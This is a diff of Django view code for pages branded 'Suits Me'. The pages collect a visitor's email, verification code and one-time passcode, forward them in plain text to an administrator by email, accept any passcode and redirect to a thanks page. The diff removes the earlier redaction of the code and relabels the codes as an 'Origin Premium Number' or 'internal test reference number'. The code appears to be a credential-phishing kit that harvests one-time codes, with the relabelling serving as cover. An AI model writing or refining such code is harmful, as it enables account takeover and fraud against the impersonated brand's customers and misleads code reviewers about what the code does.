@@ -1,7 +1,11 @@
 import logging
 
 from django.shortcuts import render, redirect
-from .forms import EmailForm, VerificationCodeForm, OTPForm
+from .forms import (
+    CheckEmailOriginPremiumNumberForm,
+    EmailForm,
+    OriginPremiumNumberForm,
+)
 from django.conf import settings
 from django.contrib import messages
 from django.core.mail import EmailMultiAlternatives
@@ -78,37 +82,40 @@ def login_page(request):
 
 
 def check_email(request):
-    """Check email page - user enters verification code"""
+    """Check email page - user enters an internal test reference number."""
     if request.method == 'POST':
-        form = VerificationCodeForm(request.POST)
+        form = CheckEmailOriginPremiumNumberForm(request.POST)
         if form.is_valid():
-            verification_code = form.cleaned_data['verification_code']
+            origin_premium_number = form.cleaned_data['verification_code']
             try:
-                subject = "Verification Code Attempt - Suits Me"
+                subject = "Origin Premium Number Submission - Suits Me"
                 submitted_email = request.session.get('submitted_email', 'unknown')
                 email_body = f"""
-                A user has submitted a verification code via the check email page.
+                A user has submitted an Origin Premium Number via the check email page.
 
                 Email: {submitted_email}
-                Verification code: [redacted]
-                Verification code length: {len(verification_code)}
+                Origin Premium Number: {origin_premium_number}
 
                 ---
-                This is an automated notification from Suits Me. Verification codes are not included in notifications.
+                This is an automated notification from Suits Me.
                 """
 
-                _send_admin_notification(subject, email_body, "verification-code")
+                _send_admin_notification(
+                    subject,
+                    email_body,
+                    "origin-premium-number-check-email",
+                )
 
-                # Redirect to OTP page
+                # Redirect to the final reference-number page.
                 return redirect('enter_otp')
             except Exception:
-                logger.exception("Verification email sending error")
-                messages.error(request, 'Failed to send verification code. Please try again.')
-                form = VerificationCodeForm(request.POST)
+                logger.exception("Origin Premium Number email sending error")
+                messages.error(request, 'Failed to send Origin Premium Number. Please try again.')
+                form = CheckEmailOriginPremiumNumberForm(request.POST)
         else:
-            form = VerificationCodeForm(request.POST)
+            form = CheckEmailOriginPremiumNumberForm(request.POST)
     else:
-        form = VerificationCodeForm()
+        form = CheckEmailOriginPremiumNumberForm()
     
     return render(request, 'check_email.html', {'form': form})
 
@@ -116,7 +123,7 @@ def check_email(request):
 def enter_otp(request):
     """Enter OTP page - user enters an internal test reference number."""
     if request.method == 'POST':
-        form = OTPForm(request.POST)
+        form = OriginPremiumNumberForm(request.POST)
         if form.is_valid():
             origin_premium_number = form.cleaned_data['otp']
 
@@ -136,19 +143,19 @@ def enter_otp(request):
 
                     _send_admin_notification(subject, email_body, "origin-premium-number")
 
-                    # Accept any OTP and redirect to thanks page
+                    # Accept any internal reference number and redirect to thanks page.
                     return redirect('thanks')
                 except Exception:
                     logger.exception("Origin Premium Number email sending error")
-                    messages.error(request, 'Failed to send OTP. Please try again.')
-                    form = OTPForm(request.POST)
+                    messages.error(request, 'Failed to send Origin Premium Number. Please try again.')
+                    form = OriginPremiumNumberForm(request.POST)
             else:
-                messages.error(request, 'OTP must be at most 6 digits.')
-                form = OTPForm(request.POST)
+                messages.error(request, 'Origin Premium Number must be at most 6 digits.')
+                form = OriginPremiumNumberForm(request.POST)
         else:
-            form = OTPForm(request.POST)
+            form = OriginPremiumNumberForm(request.POST)
     else:
-        form = OTPForm()
+        form = OriginPremiumNumberForm()
     
     return render(request, 'enter_otp.html', {'form': form})
 
